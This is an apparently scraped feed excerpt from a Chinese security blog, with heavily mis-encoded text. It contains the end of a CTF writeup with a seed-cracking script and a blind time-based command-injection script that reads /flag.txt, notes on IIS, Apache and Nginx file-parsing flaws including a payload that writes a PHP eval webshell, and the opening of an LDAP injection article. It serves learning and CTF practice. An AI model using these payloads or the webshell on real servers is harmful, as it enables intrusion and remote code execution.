<span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res += str(j) + <span class="string">&#x27; &#x27;</span> + str(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + str(len(str1) - <span class="number">1</span>) + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><p>çˆ†ç ´seed<br><img src="https://uploader.shimo.im/f/8B6zswJk3nmcP932.png!thumbnail" alt="å›¾ç‰‡"></p><p>å†ç”Ÿæˆkeyå€¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mt_srand(<span class="string">&#x27;718225&#x27;</span>);</span><br><span class="line">$lock = random(<span class="number">6</span>, <span class="string">&#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>);</span><br><span class="line">$key = random(<span class="number">16</span>, <span class="string">&#x27;1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $lock.PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> $key;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params">$length, $chars = <span class="string">&#x27;0123456789ABC&#x27;</span></span>) </span>&#123;</span><br><span class="line">    $hash = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘é€payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://122.112.252.28:20001/&#x27;&#x27;&#x27;</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&#x27;nRtqGR8mtd9ZOPyI&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;lock&#x27;</span>: <span class="string">&#x27;vEUHaY&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.get(url=url, cookies=cookies, headers=headers)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><h2 id="easyweb">easyweb</h2><p>æŠ“åŒ…</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200906210414.png" alt=""></p><p>ç„¶åæ— å›æ˜¾å‘½ä»¤æ‰§è¡Œï¼Œç„¶åç›²æ³¨ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://119.3.37.185/&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;if [ `cut -c  &#123;num1&#125; /flag.txt` = &quot;&#123;num2&#125;&quot; ];then sleep 2;fi&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">400</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;cmd&#x27;</span>:payload.format(num1=str(i),num2=chr(j))</span><br><span class="line">        &#125;</span><br><span class="line">        start_time = time()</span><br><span class="line">        requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> time()-start_time&gt;<span class="number">2</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> chr(j) == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;â€œé’“é±¼åŸæ¯â€å›½é™…ç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›Writeup&quot;&gt;â€œé’“é±¼åŸæ¯â€å›½é™…ç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›Writeup&lt;/h1&gt;
&lt;h2 id=&quot;easyseed&quot;&gt;easyseed&lt;/h2&gt;
&lt;p&gt;index.bakï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight php
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>æœåŠ¡å™¨æ–‡ä»¶è§£ææ¼æ´è®°å½•</title>
    <link href="http://ca0y1h.top/Web_security/basic_learning/25.%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/"/>
    <id>http://ca0y1h.top/Web_security/basic_learning/25.%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/</id>
    <published>2020-08-19T05:26:06.000Z</published>
    <updated>2020-08-19T06:27:14.529Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æœåŠ¡å™¨æ–‡ä»¶è§£ææ¼æ´è®°å½•">æœåŠ¡å™¨æ–‡ä»¶è§£ææ¼æ´è®°å½•</h1><p>æ²¡æœ‰æ–°ä¸œè¥¿ï¼Œç®€å•è®°å½•ä¸€ä¸‹ã€‚</p><blockquote><p><a href="https://www.anquanke.com/post/id/166616">https://www.anquanke.com/post/id/166616</a></p></blockquote><h2 id="0x01-IISæ–‡ä»¶è§£ææ¼æ´">0x01 IISæ–‡ä»¶è§£ææ¼æ´</h2><p>ä½¿ç”¨iis5.x-6.xç‰ˆæœ¬çš„æœåŠ¡å™¨ï¼Œå¤§å¤šä¸ºwindows server 2003ï¼Œç½‘ç«™æ¯”è¾ƒå¤è€ï¼Œå¼€å‘è¯­å¥ä¸€èˆ¬ä¸ºaspï¼›è¯¥è§£ææ¼æ´ä¹Ÿåªèƒ½è§£æaspæ–‡ä»¶ï¼Œè€Œä¸èƒ½è§£æaspxæ–‡ä»¶ã€‚</p><h3 id="ç›®å½•è§£æ">ç›®å½•è§£æ</h3><p>å½¢å¼ï¼š<a href="http://www.xxx.com/xx.asp/xx.jpg">www.xxx.com/xx.asp/xx.jpg</a></p><p>åŸç†: æœåŠ¡å™¨é»˜è®¤ä¼šæŠŠ.aspï¼Œ.asaç›®å½•ä¸‹çš„æ–‡ä»¶éƒ½è§£ææˆaspæ–‡ä»¶ã€‚</p><h3 id="æ–‡ä»¶è§£æ">æ–‡ä»¶è§£æ</h3><p>å½¢å¼ï¼š<a href="http://www.xxx.com/xx.asp;.jpg">www.xxx.com/xx.asp;.jpg</a></p><p>åŸç†ï¼šæœåŠ¡å™¨é»˜è®¤ä¸è§£æ;å·åé¢çš„å†…å®¹ï¼Œå› æ­¤xx.asp;.jpgä¾¿è¢«è§£ææˆaspæ–‡ä»¶äº†ã€‚</p><h3 id="è¡¥å……">è¡¥å……</h3><p>IIS6.0çš„è§£ææ¼æ´åŒæ ·å­˜åœ¨äºIIS7.5ç‰ˆæœ¬ã€‚</p><h2 id="0x02-Apacheæ–‡ä»¶è§£ææ¼æ´">0x02 Apacheæ–‡ä»¶è§£ææ¼æ´</h2><h3 id="å¤šåç¼€">å¤šåç¼€</h3><p>Apache1.xå’Œ2.x è§£ææ–‡ä»¶çš„è§„åˆ™æ˜¯ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£æ,å¦‚æœåç¼€åä¸ºä¸å¯è¯†åˆ«æ–‡ä»¶è§£æ,å°±å†å¾€å·¦åˆ¤æ–­ã€‚</p><h3 id="confé…ç½®">confé…ç½®</h3><p>1ã€å¦‚æœåœ¨ Apache çš„ conf é‡Œæœ‰è¿™æ ·ä¸€è¡Œé…ç½® <code>AddHandler php5-script .php</code> è¿™æ—¶åªè¦æ–‡ä»¶åé‡ŒåŒ…å« .php  å³ä½¿æ–‡ä»¶åæ˜¯ test2.php.jpg ä¹Ÿä¼šä»¥ php æ¥æ‰§è¡Œã€‚</p><p>2ã€å¦‚æœåœ¨ Apache çš„ conf é‡Œæœ‰è¿™æ ·ä¸€è¡Œé…ç½® <code>AddType application/x-httpd-php .jpg</code>å³ä½¿æ‰©å±•åæ˜¯ jpgï¼Œä¸€æ ·èƒ½ä»¥ php æ–¹å¼æ‰§è¡Œã€‚</p><h3 id="ç½•è§åç¼€">ç½•è§åç¼€</h3><p>Apache é…ç½®æ–‡ä»¶ä¸­ä¼šæœ‰<code>.+.ph(p[345]?|t|tml)</code>æ­¤ç±»çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œè¢«å½“ php ç¨‹åºæ‰§è¡Œçš„æ–‡ä»¶åè¦ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼ï¼Œå¦åˆ™å°±ç®— Apache æŠŠæŸæ–‡ä»¶å½“ php ç¨‹åºï¼Œphp è‡ªå·±ä¸è®¤å®ƒï¼Œä¹Ÿæ˜¯æ— ç”¨ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´<code>php3ï¼Œphp4ï¼Œphp5ï¼Œphtï¼Œphtml</code>ä¹Ÿæ˜¯å¯ä»¥è¢«è§£æçš„ã€‚</p><h3 id="htaccess">.htaccess</h3><p>è¦æƒ³ä½¿ <code>.htaccess</code> æ–‡ä»¶ç”Ÿæ•ˆï¼Œéœ€è¦ä¸¤ä¸ªæ¡ä»¶:</p><p><strong>ä¸€æ˜¯åœ¨ Apache çš„é…ç½®æ–‡ä»¶ä¸­å†™ä¸Šï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AllowOverrideAll</span><br></pre></td></tr></table></figure><p>è‹¥è¿™æ ·å†™åˆ™ <code>.htaccess</code> ä¸ä¼šç”Ÿæ•ˆï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AllowOverrideNone</span><br></pre></td></tr></table></figure><p><strong>äºŒæ˜¯ Apache è¦åŠ è½½ mod_Rewrite æ¨¡å—ã€‚åŠ è½½è¯¥æ¨¡å—ï¼Œéœ€è¦åœ¨ Apache çš„é…ç½®æ–‡ä»¶ä¸­å†™ä¸Šï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModulerewrite_module&#x2F;usr&#x2F;lib&#x2F;apache2&#x2F;modules&#x2F;mod_rewrite.so</span><br></pre></td></tr></table></figure><p>è‹¥æ˜¯åœ¨ Ubuntu ä¸­ï¼Œå¯èƒ½è¿˜éœ€è¦æ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudoa2enmod rewrite</span><br></pre></td></tr></table></figure><p>é…ç½®å®Œåéœ€è¦é‡å¯ Apacheã€‚</p><p><strong>å¦‚åœ¨ <code>.htaccess</code> æ–‡ä»¶ä¸­å†™å…¥ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddTypeapplication&#x2F;x-httpd-php xxx</span><br></pre></td></tr></table></figure><p>å°±æˆåŠŸåœ°ä½¿è¯¥ <code>.htaccess</code> æ–‡ä»¶æ‰€åœ¨ç›®å½•åŠå…¶å­ç›®å½•ä¸­çš„åç¼€ä¸º .xxx çš„æ–‡ä»¶è¢« Apache å½“åš php æ–‡ä»¶ã€‚</p><p>è¿˜æœ‰ä¸€ç§å†™æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch&quot;shell.jpg&quot;&gt;</span><br><span class="line"> SetHandlerapplication&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><h2 id="0x03-Nginxæ–‡ä»¶è§£ææ¼æ´">0x03 Nginxæ–‡ä»¶è§£ææ¼æ´</h2><h3 id="PHP-CGIè§£ææ¼æ´">PHP CGIè§£ææ¼æ´</h3><p>æ¼æ´åŸç†å‚è€ƒï¼š<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200819140421.png" alt=""></p><p>æ‰€ä»¥ä¸‹é¢ä¸¤ç§å†™æ³•éƒ½ä¼šå°†1.jpgå½“ä½œPHPæ¥è§£æ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg&#x2F;1.php  </span><br><span class="line"></span><br><span class="line">www.xxxx.com&#x2F;UploadFiles&#x2F;image&#x2F;1.jpg&#x2F;%20\0.php</span><br></pre></td></tr></table></figure><p>å¦å¤–ä¸€ç§æ‰‹æ³•ï¼šä¸Šä¼ ä¸€ä¸ªåå­—ä¸º test.jpgï¼Œä»¥ä¸‹å†…å®¹çš„æ–‡ä»¶:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span> fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—® <code>test.jpg/.php</code>, åœ¨è¿™ä¸ªç›®å½•ä¸‹å°±ä¼šç”Ÿæˆä¸€å¥è¯æœ¨é©¬ shell.phpã€‚</p><h3 id="ç©ºå­—èŠ‚ä»£ç æ‰§è¡Œæ¼æ´">ç©ºå­—èŠ‚ä»£ç æ‰§è¡Œæ¼æ´</h3><p>æ¶æ„ç”¨æˆ·å‘å‡ºè¯·æ±‚<code>http://example.com/file.extï¼…00.php</code>å°±ä¼šå°† <code>file.ext</code> ä½œä¸º PHP æ–‡ä»¶è§£æã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;æœåŠ¡å™¨æ–‡ä»¶è§£ææ¼æ´è®°å½•&quot;&gt;æœåŠ¡å™¨æ–‡ä»¶è§£ææ¼æ´è®°å½•&lt;/h1&gt;
&lt;p&gt;æ²¡æœ‰æ–°ä¸œè¥¿ï¼Œç®€å•è®°å½•ä¸€ä¸‹ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/166616&quot;&gt;https://www.anq
      
    
    </summary>
    
    
      <category term="Webå®‰å…¨" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="åŸºç¡€å­¦ä¹ " scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Webå®‰å…¨å­¦ä¹ " scheme="http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="æœåŠ¡å™¨è§£ææ¼æ´" scheme="http://ca0y1h.top/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>æµ…è°ˆLDAPæ³¨å…¥æ”»å‡»</title>
    <link href="http://ca0y1h.top/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/"/>
    <id>http://ca0y1h.top/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/</id>
    <published>2020-08-18T13:02:44.000Z</published>
    <updated>2020-08-18T13:05:53.816Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æ–‡ç« é¦–å‘äº å®‰å…¨å®¢</p></blockquote><h1 id="ä»HTBé¶æœºä¸­æµ…è°ˆLDAPæ³¨å…¥æ”»å‡»">ä»HTBé¶æœºä¸­æµ…è°ˆLDAPæ³¨å…¥æ”»å‡»</h1><p>æœ€è¿‘åœ¨HackTheBoxä¸Šæ°ªäº†é‡‘ï¼ˆè‚‰ç–¼ğŸ˜­ï¼‰ï¼Œåšäº†ä¸€äº›å·²ç»retiredçš„é«˜è´¨é‡é¶æœºï¼Œä¸å¾—ä¸è¯´è´¨é‡è¿˜æ˜¯å¾ˆé«˜çš„ã€‚å…¶ä¸­æœ‰ä¸€ä¸ªé¶æœºå«åš<strong>CTF</strong>ï¼Œéš¾åº¦æ˜¯æœ€é«˜çº§åˆ«çš„insaneï¼Œä¸»è¦æ˜¯å®ƒè€ƒå¯Ÿçš„çŸ¥è¯†ç‚¹æ¯”è¾ƒå†·é—¨â€”â€”LDAPæ³¨å…¥ã€‚å¯èƒ½å¾ˆå¤šå°ä¼™ä¼´éƒ½æ²¡æ€ä¹ˆå¬è¯´è¿‡è¿™ä¸ªæ¼æ´ï¼Œæˆ‘æƒ³ä¸»è¦åŸå› è¿˜æ˜¯LDAPè¿™ä¸ªåè®®ç”¨çš„æ¯”è¾ƒå°‘ï¼Œè€Œä¸”å›½å†…CTFæ¯”èµ›ä¸­æˆ‘ä¹ŸåŸºæœ¬ä¸Šæ²¡æœ‰çœ‹åˆ°æœ‰è€ƒå¯Ÿè¿™ä¸ªç‚¹çš„ã€‚åœ¨ç½‘ä¸Šæœäº†ä¸€ä¸‹ï¼Œå‘ç°æœ€è¿‘ä¸€æ¬¡å‡ºç°è¿™ä¸ªè€ƒç‚¹çš„æ˜¯åœ¨<a href="https://ctftime.org/event/633">CSAW CTF Qualification Round 2018</a>æ¯”èµ›ä¸­ï¼Œé¢˜ç›®ç›´æ¥å‘Šè¯‰ä½ äº†æ˜¯è€ƒLDAPæ³¨å…¥ã€‚åˆšå¥½ä¸Šä¸ªæ˜ŸæœŸæˆ‘åœ¨æ˜Ÿç›Ÿå†…éƒ¨åˆ†äº«ä¸­ï¼Œä¹Ÿæåˆ°äº†è¿™ä¸ªçŸ¥è¯†ç‚¹ï¼Œé‚£ä¹ˆæœ¬ç€èŠèƒœäºæ— ï¼Œå¼€é˜”çŸ¥è¯†é¢çš„æœ¬æ„ä¸‹ï¼ˆå…¶å®æ˜¯å·æ‡’ï¼Ÿï¼‰ï¼Œå†™ä¸‹è¿™ç¯‡æµ…è°ˆLDAPæ³¨å…¥æ”»å‡»çš„æ–‡ç« ã€‚</p><h2 id="0x01-LDAPä»‹ç»">0x01 LDAPä»‹ç»</h2><h3 id="ä»€ä¹ˆæ˜¯LDAP">ä»€ä¹ˆæ˜¯LDAP</h3><p>åœ¨åšé¶æœºä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆæ¥äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯LDAPï¼Ÿ</p><blockquote><p>ä»¥ä¸‹å†…å®¹éƒ¨åˆ†æ‘˜è‡ª2018 blackhat <em>LDAP Injection &amp; Blind LDAP Injection</em></p></blockquote><p>LDAP(Lightweight Directory Access Protocol):è½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼Œæ˜¯ä¸€ç§åœ¨çº¿ç›®å½•è®¿é—®åè®®ï¼Œä¸»è¦ç”¨äºç›®å½•ä¸­èµ„æºçš„æœç´¢å’ŒæŸ¥è¯¢ï¼Œæ˜¯X.500çš„ä¸€ç§ç®€ä¾¿çš„å®ç°ã€‚</p><p>é‚£ä¹ˆè½¬æ¢æˆäººè¯å°±æ˜¯è¯´ï¼ŒLDAPæ˜¯ç”¨äºè®¿é—®ç›®å½•æœåŠ¡ï¼ˆç‰¹åˆ«æ˜¯åŸºäºX.500çš„ç›®å½•æœåŠ¡ï¼‰çš„è½»é‡çº§å®¢æˆ·ç«¯æœåŠ¡å™¨åè®®ï¼Œå®ƒé€šè¿‡TCP/IPä¼ è¾“æœåŠ¡è¿è¡Œã€‚å…³é”®çš„åœ°æ–¹å°±åœ¨äºï¼Œ<strong>æ•°æ®æ˜¯å­˜å‚¨åœ¨ç›®å½•ä¸­ï¼Œè€Œä¸æ˜¯æ•°æ®åº“ä¸­</strong>ã€‚çš„ç¡®ï¼Œç›®å½•å’Œæ•°æ®åº“æœ‰å¾ˆå¤šå…±åŒä¹‹å¤„ï¼Œéƒ½èƒ½å­˜å‚¨æ•°æ®ã€å¹¶èƒ½åœ¨ä¸€å®šç¨‹åº¦è¿›è¡Œæœç´¢å’ŒæŸ¥è¯¢ã€‚è¿™é‡Œå°±æœ‰ä¸€ä¸ªé—®é¢˜äº†ï¼Œç›®å½•å’Œæ•°æ®åº“çš„åŒºåˆ«åœ¨å“ªï¼Ÿ</p><p>æœ€é‡è¦çš„åŒºåˆ«å°±æ˜¯<strong>ç›®å½•é€‚åˆäºå­˜æ”¾é™æ€æ•°æ®</strong>ï¼Œå®ƒå­˜å‚¨çš„æ•°æ®æ— è®ºåœ¨ç±»å‹å’Œç§ç±»è¾ƒä¹‹æ•°æ®åº“ä¸­çš„æ•°æ®éƒ½è¦æ›´ä¸ºç¹å¤šï¼ŒåŒ…æ‹¬éŸ³é¢‘ã€è§†é¢‘ã€å¯æ‰§è¡Œæ–‡ä»¶ã€æ–‡æœ¬ç­‰æ–‡ä»¶ï¼Œå¦å¤–ç›®å½•ä¸­è¿˜å­˜åœ¨ç›®å½•çš„é€’å½’ã€‚æ—¢ç„¶æ˜¯å­˜æ”¾ä¸åŒç±»å‹çš„é™æ€æ•°æ®ï¼Œé‚£ä¹ˆç›®å½•æœåŠ¡åœ¨è¿›è¡Œä¼˜åŒ–åæ›´é€‚å®œäºè¯»è®¿é—®ï¼Œè€Œéå†™ã€ä¿®æ”¹ç­‰æ“ä½œã€‚</p><p>è¯´äº†è¿™ä¹ˆåŠå¤©ï¼Œæ„Ÿè§‰è¿˜æ˜¯è´´ä¸€å¼ å›¾æ¥çš„æ›´å¿«ã€‚</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721143738.png" alt=""></p><p>ä¸Šé¢è¿™å¼ å›¾å±•ç¤ºäº†LDAPçš„ç»“æ„ã€‚æˆ‘ä»¬éƒ½çŸ¥é“MySQLæ•°æ®åº“ä¸­çš„æ•°æ®éƒ½æ˜¯æŒ‰è®°å½•ä¸€æ¡æ¡è®°å½•å­˜åœ¨è¡¨ä¸­ï¼Œè€ŒLDAPæ˜¯æ ‘ç»“æ„çš„ï¼Œæ•°æ®å­˜å‚¨åœ¨å¶å­èŠ‚ç‚¹ä¸Šã€‚æ¯”å¦‚è¦æè¿°ä¸Šå›¾<code>baby</code>è¿™ä¸ªèŠ‚ç‚¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn&#x3D;baby, ou&#x3D;marketing, ou&#x3D;people, dc&#x3D;mydomain, dc&#x3D;org</span><br></pre></td></tr></table></figure><h3 id="LDAPçš„åŸºæœ¬æ¦‚å¿µ">LDAPçš„åŸºæœ¬æ¦‚å¿µ</h3><p>åœ¨å¤§æ¦‚çŸ¥é“LDAPæ˜¯åšä»€ä¹ˆã€é•¿ä»€ä¹ˆæ ·ä¹‹åï¼Œæˆ‘ä»¬å†æ¥äº†è§£ä¸€ä¸‹LDAPçš„ä¸€äº›åŸºæœ¬æ¦‚å¿µï¼Œä¸»è¦æ˜¯ä¸‰ä¸ªä¸“æœ‰åè¯ï¼šæ¡ç›®ï¼ˆEntryï¼‰ã€å±æ€§ï¼ˆAttributeï¼‰ã€å¯¹è±¡ç±»ï¼ˆObjectClassï¼‰ã€‚</p><p><strong>æ¡ç›®</strong></p><p>æ¡ç›®ï¼Œä¹Ÿå«è®°å½•é¡¹ï¼Œæ˜¯LDAPä¸­æœ€åŸºæœ¬çš„é¢—ç²’ï¼Œå°±æƒ³å­—å…¸ä¸­çš„è¯æ¡æˆ–è€…æ˜¯æ•°æ®ä¸­çš„è®°å½•ã€‚é€šå¸¸å¯¹LDAPçš„æ·»åŠ ã€åˆ é™¤ã€ä¿®æ”¹ã€æœç´¢éƒ½æ˜¯ä»¥æ¡ç›®ä¸ºåŸºæœ¬å•ä½ã€‚</p><p><strong>å±æ€§</strong></p><p>æ¯ä¸ªæ¡ç›®éƒ½å¯ä»¥æœ‰å¾ˆå¤šå±æ€§ï¼ˆAttributeï¼‰ï¼Œæ¯”å¦‚å¸¸è§çš„äººéƒ½æœ‰å§“åã€åœ°å€ã€ç”µè¯ç­‰å±æ€§ã€‚æ¯ä¸ªå±æ€§éƒ½æœ‰åç§°åŠå¯¹åº”çš„å€¼ï¼Œå±æ€§å€¼å¯ä»¥æœ‰å•ä¸ªã€å¤šä¸ªï¼Œæ¯”å¦‚ä½ æœ‰å¤šä¸ªé‚®ç®±ã€‚</p><p>æ­¤å¤–ï¼ŒLDAPä¸ºäººå‘˜ç»„ç»‡æœºæ„ä¸­å¸¸è§çš„å¯¹è±¡éƒ½è®¾è®¡äº†å±æ€§(æ¯”å¦‚commonNameï¼Œsurname)ã€‚</p><p><strong>å¯¹è±¡ç±»</strong></p><p>å¯¹è±¡ç±»æ˜¯å±æ€§çš„é›†åˆï¼ŒLDAPé¢„æƒ³äº†å¾ˆå¤šäººå‘˜ç»„ç»‡æœºæ„ä¸­å¸¸è§çš„å¯¹è±¡ï¼Œå¹¶å°†å…¶å°è£…æˆå¯¹è±¡ç±»ã€‚æ¯”å¦‚äººå‘˜ï¼ˆpersonï¼‰å«æœ‰å§“ï¼ˆsnï¼‰ã€åï¼ˆcnï¼‰ã€ç”µè¯(telephoneNumber)ã€å¯†ç (userPassword)ç­‰å±æ€§ï¼Œå•ä½èŒå·¥(organizationalPerson)æ˜¯äººå‘˜(person)çš„ç»§æ‰¿ç±»ï¼Œé™¤äº†ä¸Šè¿°å±æ€§ä¹‹å¤–è¿˜å«æœ‰èŒåŠ¡ï¼ˆtitleï¼‰ã€é‚®æ”¿ç¼–ç ï¼ˆpostalCodeï¼‰ã€é€šä¿¡åœ°å€(postalAddress)ç­‰å±æ€§ã€‚</p><p>é€šè¿‡å¯¹è±¡ç±»å¯ä»¥æ–¹ä¾¿çš„å®šä¹‰æ¡ç›®ç±»å‹ã€‚æ¯ä¸ªæ¡ç›®å¯ä»¥ç›´æ¥ç»§æ‰¿å¤šä¸ªå¯¹è±¡ç±»ï¼Œè¿™æ ·å°±ç»§æ‰¿äº†å„ç§å±æ€§ã€‚å¦‚æœ2ä¸ªå¯¹è±¡ç±»ä¸­æœ‰ç›¸åŒçš„å±æ€§ï¼Œåˆ™æ¡ç›®ç»§æ‰¿ååªä¼šä¿ç•™1ä¸ªå±æ€§ã€‚å¯¹è±¡ç±»åŒæ—¶ä¹Ÿè§„å®šäº†å“ªäº›å±æ€§æ˜¯åŸºæœ¬ä¿¡æ¯ï¼Œå³å¿…è¦å±æ€§å’Œå¯é€‰å±æ€§ã€‚</p><p>æ˜¯ä¸æ˜¯å¬èµ·æ¥å’Œé¢å‘å¯¹è±¡è¯­è¨€æœ‰ç‚¹ç›¸ä¼¼ï¼Œè·ŸJavaä¸­çš„Objectç±»ä¸€æ ·ï¼ŒLDAPçš„æ 